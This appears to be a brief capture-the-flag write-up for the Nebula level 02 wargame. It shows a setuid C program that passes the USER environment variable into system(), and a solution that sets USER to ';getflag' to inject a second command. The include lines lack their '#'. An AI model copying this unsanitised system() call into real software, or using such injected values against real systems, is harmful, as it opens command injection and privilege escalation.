.. _nebula02:

.. role:: bash(code)
	  :language: bash

.. role:: c(code)
	  :language: c
		     
Nebula level 02
===============

Basic Information
-----------------

**Home Page** https://exploit-exercises.com/nebula/level02/

**Source Code**

.. code-block:: c
		
		include <stdlib.h>
		include <unistd.h>
		include <string.h>
		include <sys/types.h>
		include <stdio.h>

		int main(int argc, char **argv, char **envp)
		{
		    char *buffer;

		    gid_t gid;
		    uid_t uid;

		    gid = getegid();
		    uid = geteuid();

		    setresgid(gid, gid, gid);
		    setresuid(uid, uid, uid);

		    buffer = NULL;

		    asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
		    printf("about to call system(\"%s\")\n", buffer);

		    system(buffer);
		}

Solution
--------

Export a variable call :bash:`USER` like this:

:bash:`$export USER=";getflag"`

and then run

:bash:`/home/flag02/flag02`

